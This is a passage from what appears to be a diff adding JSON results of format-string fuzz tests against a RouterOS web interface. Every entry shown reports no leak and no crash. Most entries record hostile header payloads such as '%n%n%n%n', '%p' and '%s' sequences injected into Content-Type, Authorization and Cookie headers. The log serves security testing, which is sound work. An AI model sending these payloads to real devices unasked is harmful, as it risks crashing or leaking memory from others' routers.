+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:09 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 16,
+      "category": "header_format_string",
+      "name": "header_Content-Type_write_test",
+      "description": "Content-Type: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:26.331215",
+      "details": {
+        "header": "Content-Type",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:20 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h9m52s",
+          "post_uptime": "2h10m4s"
+        }
+      }
+    },
+    {
+      "id": 17,
+      "category": "header_format_string",
+      "name": "header_Content-Type_structured_leak",
+      "description": "Content-Type: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:26.651375",
+      "details": {
+        "header": "Content-Type",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:22 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 18,
+      "category": "header_format_string",
+      "name": "header_Content-Type_direct_param_access",
+      "description": "Content-Type: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:26.975537",
+      "details": {
+        "header": "Content-Type",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:22 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 19,
+      "category": "header_format_string",
+      "name": "header_Authorization_info_leak_hex",
+      "description": "Authorization: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:27.287693",
+      "details": {
+        "header": "Authorization",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:22 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 20,
+      "category": "header_format_string",
+      "name": "header_Authorization_info_leak_ptr",
+      "description": "Authorization: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:27.611855",
+      "details": {
+        "header": "Authorization",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:23 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 21,
+      "category": "header_format_string",
+      "name": "header_Authorization_crash_deref",
+      "description": "Authorization: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:28.436267",
+      "details": {
+        "header": "Authorization",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:23 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 22,
+      "category": "header_format_string",
+      "name": "header_Authorization_write_test",
+      "description": "Authorization: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:40.286189",
+      "details": {
+        "header": "Authorization",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:34 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h10m6s",
+          "post_uptime": "2h10m18s"
+        }
+      }
+    },
+    {
+      "id": 23,
+      "category": "header_format_string",
+      "name": "header_Authorization_structured_leak",
+      "description": "Authorization: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:40.610351",
+      "details": {
+        "header": "Authorization",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:36 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 24,
+      "category": "header_format_string",
+      "name": "header_Authorization_direct_param_access",
+      "description": "Authorization: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:40.934513",
+      "details": {
+        "header": "Authorization",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:36 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 25,
+      "category": "header_format_string",
+      "name": "header_Cookie_info_leak_hex",
+      "description": "Cookie: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:41.254673",
+      "details": {
+        "header": "Cookie",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:36 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 26,
+      "category": "header_format_string",
+      "name": "header_Cookie_info_leak_ptr",
+      "description": "Cookie: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:41.574833",
+      "details": {
+        "header": "Cookie",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:37 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 27,
+      "category": "header_format_string",
+      "name": "header_Cookie_crash_deref",
+      "description": "Cookie: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:42.383237",
+      "details": {
+        "header": "Cookie",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:37 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 28,
+      "category": "header_format_string",
+      "name": "header_Cookie_write_test",
+      "description": "Cookie: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:54.057071",
+      "details": {
+        "header": "Cookie",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:48 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h10m20s",
+          "post_uptime": "2h10m31s"
+        }
+      }
+    },
+    {
+      "id": 29,
+      "category": "header_format_string",
+      "name": "header_Cookie_structured_leak",
+      "description": "Cookie: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:54.425255",
+      "details": {
+        "header": "Cookie",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:49 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 30,
+      "category": "header_format_string",
+      "name": "header_Cookie_direct_param_access",
